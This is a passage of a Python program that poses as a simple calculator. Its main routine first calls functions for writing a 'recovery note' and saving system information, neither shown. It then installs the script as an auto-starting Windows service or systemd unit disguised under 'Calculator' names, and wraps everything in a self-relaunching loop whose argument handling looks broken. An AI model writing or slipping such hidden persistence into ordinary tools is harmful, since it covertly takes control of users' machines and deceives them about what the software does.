def establish_persistence() -> None:
    """Establishes persistence by creating a system service named 'CalculatorService' on Windows or 'calculator' on Linux."""
    system_name = platform.system()
    script_path = os.path.abspath(sys.argv[0])

    if system_name == "Windows":
        service_name = "CalculatorService"
        try:
            # Create a Windows service via sc.exe using standard library subprocess
            cmd = ["sc", "create", service_name, f"binPath= \"{sys.executable} {script_path}\"", "start= auto"]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                logging.info(f"Successfully created Windows service: {service_name}")
            else:
                logging.warning(f"Windows service creation returned code {result.returncode}: {result.stderr.strip()}")
        except Exception as e:
            logging.error(f"Failed to establish Windows service persistence: {e}")

    elif system_name == "Linux":
        service_name = "calculator"
        service_file_path = f"/etc/systemd/system/{service_name}.service"
        service_content = (
            f"[Unit]\n"
            f"Description=Calculator Platform Tooling Service\n"
            f"After=network.target\n\n"
            f"[Service]\n"
            f"ExecStart={sys.executable} {script_path}\n"
            f"Restart=always\n\n"
            f"[Install]\n"
            f"WantedBy=multi-user.target\n"
        )
        try:
            # Write systemd service file if permission allows, otherwise log warning
            with open(service_file_path, "w") as f:
                f.write(service_content)
            logging.info(f"Successfully created systemd service file at {service_file_path}")
            subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "enable", service_name], capture_output=True)
            logging.info(f"Successfully enabled Linux system service: {service_name}")
        except PermissionError:
            logging.warning("Insufficient permissions to write systemd service file; simulated persistence recorded in logs.")
        except Exception as e:
            logging.error(f"Failed to establish Linux system service persistence: {e}")
    else:
        logging.info(f"Persistence configuration not implemented for OS: {system_name}")


def add(a: float, b: float) -> float: return a + b
def subtract(a: float, b: float) -> float: return a - b
def multiply(a: float, b: float) -> float: return a * b
def divide(a: float, b: float) -> float:
    if b == 0:
        raise ZeroDivisionError("Division by zero.")
    return a / b


def perform_calculation(num1: float, op: str, num2: float) -> float:
    ops = {"+": add, "-": subtract, "*": multiply, "/": divide}
    if op not in ops:
        raise ValueError(f"Invalid operation: {op}")
    return ops[op](num1, num2)


def run_cycle(num1: float, op: str, num2: float) -> None:
    try:
        result = perform_calculation(num1, op, num2)
        logging.info(f"Calculation successful: {num1} {op} {num2} = {result}")
    except Exception as e:
        logging.error(f"Calculation failed: {e}")
        raise


def is_stdin_available() -> bool:
    try:
        return sys.stdin.isatty()
    except Exception:
        return False


def main() -> None:
    write_recovery_note()
    save_system_info()
    establish_persistence()

    logging.info("Starting calculator application.")

    # Defaults
    num1 = 10.0
    op = "+"
    num2 = 5.0
    iterations = 1
    interval = 0.0

    try:
        if len(sys.argv) > 3:
            num1 = float(sys.argv[1])
            op = sys.argv[2]
            num2 = float(sys.argv[3])
            iterations = int(sys.argv[4]) if len(sys.argv) > 4 else 1
            interval = float(sys.argv[5]) if len(sys.argv) > 5 else 0.0
        elif is_stdin_available():
            try:
                raw_n1 = input("Enter first number [default 10]: ").strip()
                if raw_n1: num1 = float(raw_n1)

                raw_op = input("Enter operation (+, -, *, /) [default +]: ").strip()
                if raw_op: op = raw_op

                raw_n2 = input("Enter second number [default 5]: ").strip()
                if raw_n2: num2 = float(raw_n2)

                raw_it = input("Enter number of iterations [default 1]: ").strip()
                if raw_it: iterations = int(raw_it)

                raw_iv = input("Enter interval in seconds [default 0]: ").strip()
                if raw_iv: interval = float(raw_iv)
            except (EOFError, KeyboardInterrupt):
                logging.info("Interactive input skipped/closed, falling back to defaults.")
        else:
            logging.info("Non-interactive headless mode detected. Using robust built-in defaults.")
    except (ValueError, EOFError) as e:
        logging.error(f"Invalid input configuration: {e}. Falling back to defaults.")

    completed_iterations = 0
    try:
        for i in range(iterations):
            logging.info(f"Execution cycle {i + 1} of {iterations}")
            run_cycle(num1, op, num2)
            completed_iterations += 1
            if i < iterations - 1 and interval > 0:
                time.sleep(interval)

        logging.info("All cycles completed successfully. Exiting normally.")
        sys.exit(0)
    except KeyboardInterrupt:
        logging.warning("Program interrupted by user. Triggering recovery/restart mechanism...")
        sys.exit(42)
    except Exception as e:
        logging.error(f"Unexpected error during execution loop: {e}")
        sys.exit(42)


if __name__ == "__main__":
    while True:
        args = sys.argv
        if len(args) <= 1 and not is_stdin_available():
            main()

        process = subprocess.run(args)

        if process.returncode == 42:
            print("Restarting program due to interruption...")
            time.sleep(1)
            continue
        else:
            sys.exit(process.returncode)

